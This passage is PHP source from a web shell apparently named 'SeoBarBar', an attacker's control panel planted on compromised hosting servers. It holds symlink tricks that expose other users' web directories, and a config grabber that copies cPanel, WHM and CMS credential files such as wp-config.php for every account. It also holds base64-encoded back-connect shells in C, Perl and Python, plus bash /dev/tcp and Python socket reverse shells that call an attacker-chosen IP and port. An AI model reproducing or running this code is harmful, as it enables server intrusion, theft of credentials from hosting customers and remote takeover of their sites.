	Open_Basedir : '.$show_obdir.' | Safe Mode Exec Dir : '.$show_exec.' | Safe Mode Include Dir : '.$show_include.'
	MySQL : '.$mysql.' | MSSQL : '.$mssql.' | PostgreSQL : '.$pgsql.' | Perl : '.$perl.' | Python : '.$python.' | Ruby : '.$ruby.' |  WGET : '.$wget.' | cURL : '.$curl.' | Magic Quotes : '.$magicquotes.' | SSH2 : '.$ssh2.' | Oracle : '.$oracle.' 
						
						</textarea>
						</center>';}elseif(isset($_GET[hex('mass')])){echo "<hr>
						<h2><center>Tools SeoBarBar</center></h2>
						<br>
						<center>
						<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
						<a class = 'form-control ajx' href = '?d=".hex($d)."&".hex('mass_tool')."' style='width: 250px;' height='10'><center>Mass Delete / Touch Files</center></a>
						</div>
						<div class = 'col-md-4'>
						<a class = 'form-control ajx' href = '?d=".hex($d)."&".hex('mass_user')."' style='width: 250px;' height='10'><center>Mass User Changer</center></a>
						</div>
						<div class = 'col-md-4'>
						<a class = 'form-control ajx' href = '?d=".hex($d)."&".hex('mass_title')."' style='width: 250px;' height='10'><center>Mass Title Changer</center></a>
						</div>
						
						</div></form></center><hr><br>";}elseif(isset($_GET[hex('symlink')])){echo "<hr><br>";echo "<center>
						<h2> Symlink SeoBarBar </h2> <br><br>
						<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'symlink' class = 'form-control' value = 'Symlink' style='width: 250px;' height='10'>
						</div>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'symlink2' class = 'form-control' value = 'Symlink 2' style='width: 250px;' height='10'>
						</div>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'symlink_py' class = 'form-control' value = 'Symlink Python' style='width: 250px;' height='10'>
						</div>
						
						</div></form></center><hr><br>";if(isset($_POST['symlink'])){@set_time_limit(0);echo "<br><br><center><h2>Symlink SeoBarBar</h2></center><br><br><center><div class=content>";@mkdir('sym',0777);$htaccess="Options all n DirectoryIndex Sux.html n AddType text/plain .php n AddHandler server-parsed .php n  AddType text/plain .html n AddHandler txt .html n Require None n Satisfy Any";$write=@fopen('sym/.htaccess','w');fwrite($write,$htaccess);@symlink('/','sym/root');$filelocation=basename(__FILE__);$read_named_conf=@file('/etc/named.conf');if(!$read_named_conf){echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";}else{echo "<br><br><div class='tmp'><table border='1' bordercolor='lime' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";foreach($read_named_conf as $subject){if(eregi('zone',$subject)){preg_match_all('#zone "(.*)"#',$subject,$string);flush();if(strlen(trim($string[1][0]))>2){$UID=posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));$name=$UID['name'];@symlink('/','sym/root');$name=$string[1][0];$iran='.ir';$israel='.il';$indo='.id';$sg12='.sg';$edu='.edu';$gov='.gov';$gose='.go';$gober='.gob';$mil1='.mil';$mil2='.mi';$malay='.my';$china='.cn';$japan='.jp';$austr='.au';$porn='.xxx';$as='.uk';$calfn='.ca';if(eregi("$iran",$string[1][0])or eregi("$israel",$string[1][0])or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0])or eregi("$edu",$string[1][0])or eregi("$gov",$string[1][0])or eregi("$gose",$string[1][0])or eregi("$gober",$string[1][0])or eregi("$mil1",$string[1][0])or eregi("$mil2",$string[1][0])or eregi("$malay",$string[1][0])or eregi("$china",$string[1][0])or eregi("$japan",$string[1][0])or eregi("$austr",$string[1][0])or eregi("$porn",$string[1][0])or eregi("$as",$string[1][0])or eregi("$calfn",$string[1][0])){$name="<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>';}echo "
			<tr>
			<td>
			<div class='dom'><a target='_blank' href='//www.".$string[1][0]."'/>".$name." </a> </div>
			</td>
			<td>
			".$UID['name']."
			</td>
			<td>
			<a href='sym/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a>
			</td>
			</tr></div> ";flush();}}}}echo "</center></table>";}elseif(isset($_POST['symlink2'])){$dir=path();$full=str_replace($_SERVER['DOCUMENT_ROOT'],"",$dir);$d0mains=@file("/etc/named.conf");if($d0mains){@mkdir("Exc_sym",0777);@chdir("Exc_sym");@exe("ln -s / root");$file3='Options Indexes FollowSymLinks
DirectoryIndex Exc.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';$fp3=fopen('.htaccess','w');$fw3=fwrite($fp3,$file3);@fclose($fp3);echo "
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";$dcount=1;foreach($d0mains as $d0main){if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#',$d0main,$domains);flush();if(strlen(trim($domains[1][0]))>2){$user=posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));echo "<tr align=center><td><font size=2>".$dcount."</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/Exc_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";flush();$dcount++;}}}echo "</table>";}else{$TEST=@file('/etc/passwd');if($TEST){@mkdir("Exc_sym",0777);@chdir("Exc_sym");exe("ln -s / root");$file3='Options Indexes FollowSymLinks
DirectoryIndex Exc.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';$fp3=fopen('.htaccess','w');$fw3=fwrite($fp3,$file3);@fclose($fp3);echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";$dcount=1;$file=fopen("/etc/passwd","r")or exit("Unable to open file!");while(!feof($file)){$s=fgets($file);$matches=array();$t=preg_match('/\/(.*?)\:\//s',$s,$matches);$matches=str_replace("home/","",$matches[1]);if(strlen($matches)>12||strlen($matches)==0||$matches=="bin"||$matches=="etc/X11/fs"||$matches=="var/lib/nfs"||$matches=="var/arpwatch"||$matches=="var/gopher"||$matches=="sbin"||$matches=="var/adm"||$matches=="usr/games"||$matches=="var/ftp"||$matches=="etc/ntp"||$matches=="var/www"||$matches=="var/named")continue;echo "<tr><td align=center><font size=2>".$dcount."</td>
 <td align=center><font class=txt>".$matches."</td>";echo"<td align=center><font class=txt><a href=$full/Exc_sym/root/home/".$matches."/public_html target='_blank'>Symlink</a></td></tr>";$dcount++;}fclose($file);echo "</table>";}else{if($os!="Windows"){@mkdir("Exc_sym",0777);@chdir("Exc_sym");@exe("ln -s / root");$file3='
 Options Indexes FollowSymLinks
DirectoryIndex Exc.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any
';$fp3=fopen('.htaccess','w');$fw3=fwrite($fp3,$file3);@fclose($fp3);echo "
 <h2><center>Symlink2 SeoBarBar</center></h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";$temp="";$val1=0;$val2=1000;for(;$val1<=$val2;$val1++){$uid=@posix_getpwuid($val1);if($uid)$temp.=join(':',$uid)."
";}echo '<br/>';$temp=trim($temp);$file5=fopen("test.txt","w");fputs($file5,$temp);fclose($file5);$dcount=1;$file=fopen("test.txt","r")or exit("Unable to open file!");while(!feof($file)){$s=fgets($file);$matches=array();$t=preg_match('/\/(.*?)\:\//s',$s,$matches);$matches=str_replace("home/","",$matches[1]);if(strlen($matches)>12||strlen($matches)==0||$matches=="bin"||$matches=="etc/X11/fs"||$matches=="var/lib/nfs"||$matches=="var/arpwatch"||$matches=="var/gopher"||$matches=="sbin"||$matches=="var/adm"||$matches=="usr/games"||$matches=="var/ftp"||$matches=="etc/ntp"||$matches=="var/www"||$matches=="var/named")continue;echo "<tr><td align=center><font size=2>".$dcount."</td>
 <td align=center><font class=txt>".$matches."</td>";echo"<td align=center><font class=txt><a href=$full/Exc_sym/root/home/".$matches."/public_html target='_blank'>Symlink</a></td></tr>";$dcount++;}fclose($file);echo "</table></center>";unlink("test.txt");}else echo "<center><font size=3>Cannot create Symlink</font></center>";}}}elseif(isset($_POST['symlink_py'])){$sym_dir=mkdir('ia_sympy',0755);chdir('ia_sympy');$file_sym="sym.py";$sym_script="Iy8qUHl0aG9uDQoNCmltcG9ydCB0aW1lDQppbXBvcnQgb3MNCmltcG9ydCBzeXMNCmltcG9ydCByZQ0KDQpvcy5zeXN0ZW0oImNvbG9yIEMiKQ0KDQpodGEgPSAiXG5GaWxlIDogLmh0YWNjZXNzIC8vIENyZWF0ZWQgU3VjY2Vzc2Z1bGx5IVxuIg0KZiA9ICJBbGwgUHJvY2Vzc2VzIERvbmUhXG5TeW1saW5rIEJ5cGFzc2VkIFN1Y2Nlc3NmdWxseSFcbiINCnByaW50ICJcbiINCnByaW50ICJ+Iio2MA0KcHJpbnQgIlN5bWxpbmsgQnlwYXNzIDIwMTQgYnkgTWluZGxlc3MgSW5qZWN0b3IgIg0KcHJpbnQgIiAgICAgICAgICAgICAgU3BlY2lhbCBHcmVldHogdG8gOiBQYWsgQ3liZXIgU2t1bGx6Ig0KcHJpbnQgIn4iKjYwDQoNCm9zLm1ha2VkaXJzKCdicnVkdWxzeW1weScpDQpvcy5jaGRpcignYnJ1ZHVsc3ltcHknKQ0KDQpzdXNyPVtdDQpzaXRleD1bXQ0Kb3Muc3lzdGVtKCJsbiAtcyAvIGJydWR1bC50eHQiKQ0KDQpoID0gIk9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rc1xuRGlyZWN0b3J5SW5kZXggYnJ1ZHVsLnBodG1sXG5BZGRUeXBlIHR4dCAucGhwXG5BZGRIYW5kbGVyIHR4dCAucGhwIg0KbSA9IG9wZW4oIi5odGFjY2VzcyIsIncrIikNCm0ud3JpdGUoaCkNCm0uY2xvc2UoKQ0KcHJpbnQgaHRhDQoNCnNmID0gIjxodG1sPjx0aXRsZT5TeW1saW5rIFB5dGhvbjwvdGl0bGU+PGNlbnRlcj48Zm9udCBjb2xvcj13aGl0ZSBzaXplPTU+U3ltbGluayBCeXBhc3MgMjAxNzxicj48Zm9udCBzaXplPTQ+TWFkZSBCeSBNaW5kbGVzcyBJbmplY3RvciA8YnI+UmVjb2RlZCBCeSBDb243ZXh0PC9mb250PjwvZm9udD48YnI+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0zPjx0YWJsZT4iDQoNCm8gPSBvcGVuKCcvZXRjL3Bhc3N3ZCcsJ3InKQ0Kbz1vLnJlYWQoKQ0KbyA9IHJlLmZpbmRhbGwoJy9ob21lL1x3KycsbykNCg0KZm9yIHh1c3IgaW4gbzoNCgl4dXNyPXh1c3IucmVwbGFjZSgnL2hvbWUvJywnJykNCglzdXNyLmFwcGVuZCh4dXNyKQ0KcHJpbnQgIi0iKjMwDQp4c2l0ZSA9IG9zLmxpc3RkaXIoIi92YXIvbmFtZWQiKQ0KDQpmb3IgeHhzaXRlIGluIHhzaXRlOg0KCXh4c2l0ZT14eHNpdGUucmVwbGFjZSgiLmRiIiwiIikNCglzaXRleC5hcHBlbmQoeHhzaXRlKQ0KcHJpbnQgZg0KcGF0aD1vcy5nZXRjd2QoKQ0KaWYgIi9wdWJsaWNfaHRtbC8iIGluIHBhdGg6DQoJcGF0aD0iL3B1YmxpY19odG1sLyINCmVsc2U6DQoJcGF0aCA9ICIvaHRtbC8iDQpjb3VudGVyPTENCmlwcz1vcGVuKCJicnVkdWwucGh0bWwiLCJ3IikNCmlwcy53cml0ZShzZikNCg0KZm9yIGZ1c3IgaW4gc3VzcjoNCglmb3IgZnNpdGUgaW4gc2l0ZXg6DQoJCWZ1PWZ1c3JbMDo1XQ0KCQlzPWZzaXRlWzA6NV0NCgkJaWYgZnU9PXM6DQoJCQlpcHMud3JpdGUoIjxib2R5IGJnY29sb3I9YmxhY2s+PHRyPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6d2hpdGU7PiVzPC90ZD48dGQgc3R5bGU9Zm9udC1mYW1pbHk6Y2FsaWJyaTtmb250LXdlaWdodDpib2xkO2NvbG9yOnJlZDs+JXM8L3RkPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7PjxhIGhyZWY9YnJ1ZHVsLnR4dC9ob21lLyVzJXMgdGFyZ2V0PV9ibGFuayA+JXM8L2E+PC90ZD4iJShjb3VudGVyLGZ1c3IsZnVzcixwYXRoLGZzaXRlKSkNCgkJCWNvdW50ZXI9Y291bnRlcisx";$sym=fopen($file_sym,"w");fwrite($sym,base64_decode($sym_script));chmod($file_sym,0755);$jancok=exe("python sym.py");echo "<br><center>Done ... <a href='ia_sympy/brudulsympy/' target='_blank'>Klik Here</a>";}}elseif(isset($_GET[hex('config')])){$dir=path();if($_POST){$passwd=$_POST['passwd'];mkdir("MariconFig",0777);$isi_htc="Options all
Require None
Satisfy Any";$htc=fopen("MariconFig/.htaccess","w");fwrite($htc,$isi_htc);preg_match_all('/(.*?):x:/',$passwd,$user_config);foreach($user_config[1]as $user_Mari){$user_config_dir="/home/$user_Mari/public_html/";if(is_readable($user_config_dir)){$grab_config=array("/home/$user_Mari/.my.cnf"=>"cpanel","/home/$user_Mari/.accesshash"=>"WHM-accesshash","/home/$user_Mari/public_html/bw-configs/config.ini"=>"BosWeb","/home/$user_Mari/public_html/config/koneksi.php"=>"Lokomedia","/home/$user_Mari/public_html/lokomedia/config/koneksi.php"=>"Lokomedia","/home/$user_Mari/public_html/clientarea/configuration.php"=>"WHMCS","/home/$user_Mari/public_html/whm/configuration.php"=>"WHMCS","/home/$user_Mari/public_html/whmcs/configuration.php"=>"WHMCS","/home/$user_Mari/public_html/forum/config.php"=>"phpBB","/home/$user_Mari/public_html/sites/default/settings.php"=>"Drupal","/home/$user_Mari/public_html/config/settings.inc.php"=>"PrestaShop","/home/$user_Mari/public_html/app/etc/local.xml"=>"Magento","/home/$user_Mari/public_html/joomla/configuration.php"=>"Joomla","/home/$user_Mari/public_html/configuration.php"=>"Joomla","/home/$user_Mari/public_html/wp/wp-config.php"=>"WordPress","/home/$user_Mari/public_html/wordpress/wp-config.php"=>"WordPress","/home/$user_Mari/public_html/wp-config.php"=>"WordPress","/home/$user_Mari/public_html/admin/config.php"=>"OpenCart","/home/$user_Mari/public_html/slconfig.php"=>"Sitelok","/home/$user_Mari/public_html/application/config/database.php"=>"CodeIgniter","/home1/$user_Mari/.my.cnf"=>"cpanel","/home1/$user_Mari/.accesshash"=>"WHM-accesshash","/home1/$user_Mari/public_html/bw-configs/config.ini"=>"BosWeb","/home1/$user_Mari/public_html/config/koneksi.php"=>"Lokomedia","/home1/$user_Mari/public_html/lokomedia/config/koneksi.php"=>"Lokomedia","/home1/$user_Mari/public_html/clientarea/configuration.php"=>"WHMCS","/home1/$user_Mari/public_html/whm/configuration.php"=>"WHMCS","/home1/$user_Mari/public_html/whmcs/configuration.php"=>"WHMCS","/home1/$user_Mari/public_html/forum/config.php"=>"phpBB","/home1/$user_Mari/public_html/sites/default/settings.php"=>"Drupal","/home1/$user_Mari/public_html/config/settings.inc.php"=>"PrestaShop","/home1/$user_Mari/public_html/app/etc/local.xml"=>"Magento","/home1/$user_Mari/public_html/joomla/configuration.php"=>"Joomla","/home1/$user_Mari/public_html/configuration.php"=>"Joomla","/home1/$user_Mari/public_html/wp/wp-config.php"=>"WordPress","/home1/$user_Mari/public_html/wordpress/wp-config.php"=>"WordPress","/home1/$user_Mari/public_html/wp-config.php"=>"WordPress","/home1/$user_Mari/public_html/admin/config.php"=>"OpenCart","/home1/$user_Mari/public_html/slconfig.php"=>"Sitelok","/home1/$user_Mari/public_html/application/config/database.php"=>"CodeIgniter","/home2/$user_Mari/.my.cnf"=>"cpanel","/home2/$user_Mari/.accesshash"=>"WHM-accesshash","/home2/$user_Mari/public_html/bw-configs/config.ini"=>"BosWeb","/home2/$user_Mari/public_html/config/koneksi.php"=>"Lokomedia","/home2/$user_Mari/public_html/lokomedia/config/koneksi.php"=>"Lokomedia","/home2/$user_Mari/public_html/clientarea/configuration.php"=>"WHMCS","/home2/$user_Mari/public_html/whm/configuration.php"=>"WHMCS","/home2/$user_Mari/public_html/whmcs/configuration.php"=>"WHMCS","/home2/$user_Mari/public_html/forum/config.php"=>"phpBB","/home2/$user_Mari/public_html/sites/default/settings.php"=>"Drupal","/home2/$user_Mari/public_html/config/settings.inc.php"=>"PrestaShop","/home2/$user_Mari/public_html/app/etc/local.xml"=>"Magento","/home2/$user_Mari/public_html/joomla/configuration.php"=>"Joomla","/home2/$user_Mari/public_html/configuration.php"=>"Joomla","/home2/$user_Mari/public_html/wp/wp-config.php"=>"WordPress","/home2/$user_Mari/public_html/wordpress/wp-config.php"=>"WordPress","/home2/$user_Mari/public_html/wp-config.php"=>"WordPress","/home2/$user_Mari/public_html/admin/config.php"=>"OpenCart","/home2/$user_Mari/public_html/slconfig.php"=>"Sitelok","/home2/$user_Mari/public_html/application/config/database.php"=>"CodeIgniter","/home3/$user_Mari/.my.cnf"=>"cpanel","/home3/$user_Mari/.accesshash"=>"WHM-accesshash","/home3/$user_Mari/public_html/bw-configs/config.ini"=>"BosWeb","/home3/$user_Mari/public_html/config/koneksi.php"=>"Lokomedia","/home3/$user_Mari/public_html/lokomedia/config/koneksi.php"=>"Lokomedia","/home3/$user_Mari/public_html/clientarea/configuration.php"=>"WHMCS","/home3/$user_Mari/public_html/whm/configuration.php"=>"WHMCS","/home3/$user_Mari/public_html/whmcs/configuration.php"=>"WHMCS","/home3/$user_Mari/public_html/forum/config.php"=>"phpBB","/home3/$user_Mari/public_html/sites/default/settings.php"=>"Drupal","/home3/$user_Mari/public_html/config/settings.inc.php"=>"PrestaShop","/home3/$user_Mari/public_html/app/etc/local.xml"=>"Magento","/home3/$user_Mari/public_html/joomla/configuration.php"=>"Joomla","/home3/$user_Mari/public_html/configuration.php"=>"Joomla","/home3/$user_Mari/public_html/wp/wp-config.php"=>"WordPress","/home3/$user_Mari/public_html/wordpress/wp-config.php"=>"WordPress","/home3/$user_Mari/public_html/wp-config.php"=>"WordPress","/home3/$user_Mari/public_html/admin/config.php"=>"OpenCart","/home3/$user_Mari/public_html/slconfig.php"=>"Sitelok","/home3/$user_Mari/public_html/application/config/database.php"=>"CodeIgniter","/home4/$user_Mari/.my.cnf"=>"cpanel","/home4/$user_Mari/.accesshash"=>"WHM-accesshash","/home4/$user_Mari/public_html/bw-configs/config.ini"=>"BosWeb","/home4/$user_Mari/public_html/config/koneksi.php"=>"Lokomedia","/home4/$user_Mari/public_html/lokomedia/config/koneksi.php"=>"Lokomedia","/home4/$user_Mari/public_html/clientarea/configuration.php"=>"WHMCS","/home4/$user_Mari/public_html/whm/configuration.php"=>"WHMCS","/home4/$user_Mari/public_html/whmcs/configuration.php"=>"WHMCS","/home4/$user_Mari/public_html/forum/config.php"=>"phpBB","/home4/$user_Mari/public_html/sites/default/settings.php"=>"Drupal","/home4/$user_Mari/public_html/config/settings.inc.php"=>"PrestaShop","/home4/$user_Mari/public_html/app/etc/local.xml"=>"Magento","/home4/$user_Mari/public_html/joomla/configuration.php"=>"Joomla","/home4/$user_Mari/public_html/configuration.php"=>"Joomla","/home4/$user_Mari/public_html/wp/wp-config.php"=>"WordPress","/home4/$user_Mari/public_html/wordpress/wp-config.php"=>"WordPress","/home4/$user_Mari/public_html/wp-config.php"=>"WordPress","/home4/$user_Mari/public_html/admin/config.php"=>"OpenCart","/home4/$user_Mari/public_html/slconfig.php"=>"Sitelok","/home4/$user_Mari/public_html/application/config/database.php"=>"CodeIgniter","/home5/$user_Mari/.my.cnf"=>"cpanel","/home5/$user_Mari/.accesshash"=>"WHM-accesshash","/home5/$user_Mari/public_html/bw-configs/config.ini"=>"BosWeb","/home5/$user_Mari/public_html/config/koneksi.php"=>"Lokomedia","/home5/$user_Mari/public_html/lokomedia/config/koneksi.php"=>"Lokomedia","/home5/$user_Mari/public_html/clientarea/configuration.php"=>"WHMCS","/home5/$user_Mari/public_html/whm/configuration.php"=>"WHMCS","/home5/$user_Mari/public_html/whmcs/configuration.php"=>"WHMCS","/home5/$user_Mari/public_html/forum/config.php"=>"phpBB","/home5/$user_Mari/public_html/sites/default/settings.php"=>"Drupal","/home5/$user_Mari/public_html/config/settings.inc.php"=>"PrestaShop","/home5/$user_Mari/public_html/app/etc/local.xml"=>"Magento","/home5/$user_Mari/public_html/joomla/configuration.php"=>"Joomla","/home5/$user_Mari/public_html/configuration.php"=>"Joomla","/home5/$user_Mari/public_html/wp/wp-config.php"=>"WordPress","/home5/$user_Mari/public_html/wordpress/wp-config.php"=>"WordPress","/home5/$user_Mari/public_html/wp-config.php"=>"WordPress","/home5/$user_Mari/public_html/admin/config.php"=>"OpenCart","/home5/$user_Mari/public_html/slconfig.php"=>"Sitelok","/home5/$user_Mari/public_html/application/config/database.php"=>"CodeIgniter","/home6/$user_Mari/.my.cnf"=>"cpanel","/home6/$user_Mari/.accesshash"=>"WHM-accesshash","/home6/$user_Mari/public_html/bw-configs/config.ini"=>"BosWeb","/home6/$user_Mari/public_html/config/koneksi.php"=>"Lokomedia","/home6/$user_Mari/public_html/lokomedia/config/koneksi.php"=>"Lokomedia","/home6/$user_Mari/public_html/clientarea/configuration.php"=>"WHMCS","/home6/$user_Mari/public_html/whm/configuration.php"=>"WHMCS","/home6/$user_Mari/public_html/whmcs/configuration.php"=>"WHMCS","/home6/$user_Mari/public_html/forum/config.php"=>"phpBB","/home6/$user_Mari/public_html/sites/default/settings.php"=>"Drupal","/home6/$user_Mari/public_html/config/settings.inc.php"=>"PrestaShop","/home6/$user_Mari/public_html/app/etc/local.xml"=>"Magento","/home6/$user_Mari/public_html/joomla/configuration.php"=>"Joomla","/home6/$user_Mari/public_html/configuration.php"=>"Joomla","/home6/$user_Mari/public_html/wp/wp-config.php"=>"WordPress","/home6/$user_Mari/public_html/wordpress/wp-config.php"=>"WordPress","/home6/$user_Mari/public_html/wp-config.php"=>"WordPress","/home6/$user_Mari/public_html/admin/config.php"=>"OpenCart","/home6/$user_Mari/public_html/slconfig.php"=>"Sitelok","/home6/$user_Mari/public_html/application/config/database.php"=>"CodeIgniter");foreach($grab_config as $config=>$nama_config){$ambil_config=mari_get_contents($config);if($ambil_config==''){}else{$file_config=fopen("MariconFig/$user_Mari-$nama_config.txt","w");fputs($file_config,$ambil_config);}}}}$baru=hex($dir);$baru2=hex('MariconFig');echo"<br><br><center><a class = 'ajx' href='?d=$baru&$baru2'><font color=red>Selesai.. markicob!</font></a></center>";}else{$baru=hex($dir);$baru2=hex('bypass-passwd');echo "<hr><br><center>";echo "<h2>Config Grabber SeoBarBar</h2>";echo"<form method=\"post\" action=\"\"><center>etc/passwd ( Error ? <a class = 'ajx' href='?d=$baru&$baru2'>Bypass Here</a> )<br><textarea name=\"passwd\" class='area form-control' rows='15' cols='60'>
";echo mari_get_contents('/etc/passwd');echo "</textarea><br><input type=\"submit\" value=\"Grab\" class = 'form-control' style='width:250px;'></td></tr></center>
";echo "<br><hr>";}}elseif(isset($_GET[hex('network')])){$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBkYWVtb24oMSwwKTsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICAgICAgIHBlcnJvcigiQ29ubmVjdCBmYWlsIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICBkdXAyKGZkLCAwKTsNCiAgICBkdXAyKGZkLCAxKTsNCiAgICBkdXAyKGZkLCAyKTsNCiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICBjbG9zZShmZCk7DQp9";$back_connect_p="IyEvdXNyL2Jpbi9lbnYgcGVybAp1c2UgSU86OlNvY2tldDsKJG9zPSReTzsKJHNoPSJleHBvcnQgVEVSTT14dGVybTtQUzE9J1wkUFdEXD4nO2V4cG9ydCBQUzE7L2Jpbi9zaCAtaSI7CmlmKCRvcz1+bS93aW4vaSl7JHNoPSIlQ09NU1BFQyUgL0siO30KJHQ9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOwpzb2NrZXQoUywmUEZfSU5FVCwmU09DS19TVFJFQU0sJHQpfHxkaWUoKTsKaWYoQEFSR1Y9PTEpewoJJHA9JEFSR1ZbMF07CglzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7CgliaW5kKFMsc29ja2FkZHJfaW4oJHAsSU5BRERSX0FOWSkpfHxkaWUoKTsKCWxpc3RlbihTLDMpfHxkaWUoKTsKCWFjY2VwdChDLFMpOwoJc2VuZChDLCJtYVJpZG9ObyBzaGVsbCA6IGNvbm5lY3RlZFxuIiwwKTsKCW9wZW4gU1RESU4sIjwmQyI7b3BlbiBTVERPVVQsIj4mQyI7b3BlbiBTVERFUlIsIj4mQyI7CglleGVjICRzaHx8ZGllKCk7CgljbG9zZShDKTtjbG9zZShTKTtjbG9zZShTVERJTik7Y2xvc2UoU1RET1VUKTtjbG9zZShTVERFUlIpOwoJZXhpdCAwOwoKfQplbHNpZihAQVJHVj09Mil7CgkkcD0kQVJHVlswXTsKCSRoPSRBUkdWWzFdOwoJJGk9aW5ldF9hdG9uKCRoKXx8ZGllKCk7CgkkYT1zb2NrYWRkcl9pbigkcCwkaSl8fGRpZSgpOwoJY29ubmVjdChTLCRhKXx8ZGllKCk7CglzZW5kKFMsIm1hUmlkb05vIHNoZWxsIDogY29ubmVjdGVkXG4iLDApOwoJb3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTsKCWV4ZWMgJHNofHxkaWUoKTsKCWNsb3NlKFMpO2Nsb3NlKFNURElOKTtjbG9zZShTVERPVVQpO2Nsb3NlKFNUREVSUik7Cn0KZWxzZXtleGl0KDEpO30=";echo "<hr><br>";echo "<center>
						<h2> Networks SeoBarBar </h2> <br><br>

	<form method = 'POST'>
	<span>Back-connect to</span><br/>
	Server: <input type='text' name='p2' value=".$_SERVER['REMOTE_ADDR']."> Port: <input type='text' name='p3' value='5433'> Using: <label><select name='p1'><option value='dono'>Bash</option><option value='bcc'>C</option><option value='bcpy'>Python</option></select></label> <input type=submit value='submit'>
	</form><br>";if(isset($_POST['p1'])){function cf($f,$t){$w=@fopen($f,"w")or@function_exists('file_put_contents');if($w){@fwrite($w,base64_decode($t))or@fputs($w,base64_decode($t))or@file_put_contents($f,base64_decode($t));@fclose($w);}}if($_POST['p1']=='bcc'){cf("/tmp/bc.c",$back_connect_c);$=exe("gcc -o /tmp/bc /tmp/bc.c");@unlink("/tmp/bc.c");$=exe("gcc -o /tmp/bc /tmp/bc.c");$.=exe("/tmp/bc ".$_POST['p2']." ".$_POST['p3']." &");echo"<pre class=ml1>$".exe("ps aux | grep bc")."</pre>";}if($_POST['p1']=='dono'){$cmd='setsid bash';$=exe($cmd." -i &>/dev/tcp/".$_POST['p2']."/".$_POST['p3']." 0>&1 &");echo"<pre class=ml1>$".exe("ps aux | grep setsid")."</pre>";}if($_POST['p1']=='bcpy'){$cmd='python -c';$=exe($cmd." import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((".$_POST['p2'].",".$_POST['p3']."));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);");echo"<pre class=ml1>$".exe("ps aux | grep python")."</pre>";}}echo '</div>'; ?><?php }elseif(isset($_GET[hex('cgi')])){echo "<hr><br>";echo "<center>
						<h2> CGI SeoBarBar </h2> <br><br>
						<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'cgi' class = 'form-control' value = 'CGI Perl' style='width: 250px;' height='10'>
						</div>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'cgi2' class = 'form-control' value = 'CGI Perl 2' style='width: 250px;' height='10'>
						</div>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'cgipy' class = 'form-control' value = 'CGI Python' style='width: 250px;' height='10'>
						</div>
						
						</div></form></center><hr><br>";if(isset($_POST['cgi'])){if(!is_dir("mari_cgi")){mkdir('mari_cgi',0755);}chdir('mari_cgi');$file_cgi="cgi.MariDono";$memeg=".htaccess";$isi_htcgi="OPTIONS Indexes Includes ExecCGI FollowSymLinks 
 AddType application/x-httpd-cgi .MariDono 
 AddHandler cgi-script .MariDono 
